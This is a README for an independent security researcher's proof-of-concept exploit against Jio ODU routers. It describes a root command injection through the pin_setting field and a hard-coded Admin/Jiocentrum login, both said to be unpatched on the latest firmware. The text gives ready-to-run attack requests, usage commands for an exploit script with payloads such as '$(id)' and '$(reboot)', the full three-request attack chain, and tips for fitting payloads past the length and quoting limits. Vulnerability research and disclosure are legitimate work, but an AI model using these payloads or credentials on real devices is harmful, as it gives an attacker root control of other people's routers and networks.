# JODU 5174x - WebUI Root Command Injection

Independent security research by [@joyas11](https://github.com/joyas11).

One vulnerability in the Jio ODU WebUI, reachable from the local network:

| ID         | Class                           | Severity | Status              |
| ---------- | ------------------------------- | -------- | ------------------- |
| JODU-51740 | OS command injection (CWE-78)   | High     | unpatched in `48_S` |
| JODU-51741 | Hard-coded credential (CWE-798) | High     | unpatched in `48_S` |

The command injection is post-login and yields **root**. The hard-coded
credential is the pre-auth bypass that makes the injection reachable on a unit
with an unknown WebUI password (Uses default Admin/Jiocentrum as credentials).

Affected: **JODU51740** and **JODU51741**, including the latest
`JODU5174x_REL_1315_01_48_S` firmware.

```
POST /cgi-bin/cgi/req_PINLockSave.cgi
{"RequestVerifyToken":"<token>","pin_setting":"$(id)","pin_code":"1234"}
```

`FXcgiMain` runs as root under lighttpd, so the injected command executes as
root.

---

## Affected devices

Works on current latest firmware as of 22/11/2026.

| Model     | Marketing | Firmware                                                   |
| --------- | --------- | ---------------------------------------------------------- |
| JODU51740 | 740       | `JODU51740_REL_1315_01_48_S`, `JODU51740_REL_1315_01_28_S` |
| JODU51741 | 741       | `JODU5174x_REL_1315_01_48_S`, `JODU51741_REL_1315_01_28_S` |

## Root cause

`pin_setting` is validated only for emptiness and then interpolated into a shell
command through `popen()`:

```c
__sprintf_chk(cmd, 1, 0x80,
    "3gcmif pin_setting -p1 \"%s\" -p2 \"%s\" 2>/dev/null",
    pin_setting, pin_code);
utl_systemCmd(cmd, out, 0x100);        /* popen(cmd, "r") -> /bin/sh -c */
```

The sibling field `pin_code` is format-locked by `check_pin` (4-8 digits).
`pin_setting` gets `check_empty` only - no allow-list, no blacklist, no escaping.
The value sits inside double quotes, but the shell still performs command
substitution there, so `$(...)` and backticks execute as root.

## Hard-coded credential

`POST /cgi-bin/app/account/auth` accepts `Admin` / `Jiocentrum` before any
session exists and sets `login=1`. A following tokenless request to a
token-announcing route mints a session token. The PoC uses this only as a
fallback.

## Usage

`--cmd` takes the payload. Pass it as the full `$(...)` substitution, or as a
bare command (wrapped automatically). Nothing is hardcoded.

> In `cmd.exe`, single quotes are literal, so use `"$(id)"`. The script
> also strips one matching pair of surrounding quotes if you paste them anyway.

### Python (standard library only)

```sh
# your own webui password
python jodu5174x_pinlock_rce.py https://192.168.225.1 --ask-pass --cmd '$(id > /tmp/cgi_pwn)'

# with a password
python jodu5174x_pinlock_rce.py https://192.168.225.1 --password 'my-Pw' --cmd '$(id)'

# any other payload
python jodu5174x_pinlock_rce.py https://192.168.225.1 --password 'my-Pw' --cmd '$(reboot)'

# factory configuration / unknown password: falls back automatically
python jodu5174x_pinlock_rce.py https://192.168.225.1 --cmd '$(id)'
```
### IPv6

The target may be an IPv6 literal, bare or bracketed; it is bracketed
automatically and a zone id is URL-encoded.

```sh
python jodu5174x_pinlock_rce.py 2001:db8::1 --cmd '$(id)'
python jodu5174x_pinlock_rce.py 'https://[2001:db8::1]:8443' --cmd '$(id)'
```

For link-local targets use the interface zone, written `%25` in the URL.

## What to expect

The injection is confirmed: the handler returns its JSON reply only after
`popen()` has run the payload. The reply is printed as-is, and the effect of the
payload is for you to confirm through your own channel (a file, a service, the
device's own state). Nothing is assumed about what the command does.

## How it works

Three requests, two single-use tokens, one cookie jar:

1. `POST /cgi-bin/cgi/token_query.cgi` `{}`
   -> `Set-Cookie: QSESSIONID=...` + pre-login `RequestVerifyToken`
2. `POST /cgi-bin/cgi/login_req.cgi`
   `{"RequestVerifyToken":"<pre-login>","usr":"Admin","pwd":"<webui pw>"}`
   -> sets `login=1` and mints the session token
3. `POST /cgi-bin/cgi/req_PINLockSave.cgi`
   `{"RequestVerifyToken":"<session>","pin_setting":"$(id)","pin_code":"1234"}`

Password order: supplied, then factory default, then the hard-coded credential.

## Notes

- The rendered command must fit a 128-byte buffer (`__sprintf_chk` aborts
  otherwise), so keep the inner command under about 75 characters.
- Do not send a literal `"` in the payload - it breaks out of the intended
  field. Use `$(...)`, backticks and `${IFS}` for spaces.

## Credit

Research, analysis and PoC by [@joyas11](https://github.com/joyas11).
Static ARM/Thumb ELF analysis of the decrypted `rootfs`/`usrfs` volumes, with
live validation on owned hardware.

## License

MIT. See `LICENSE`.

## Responsible use

Test only against hardware you own or are explicitly authorised to assess. The payload runs as
root; you are responsible for any effect on the device, the SIM and the network.
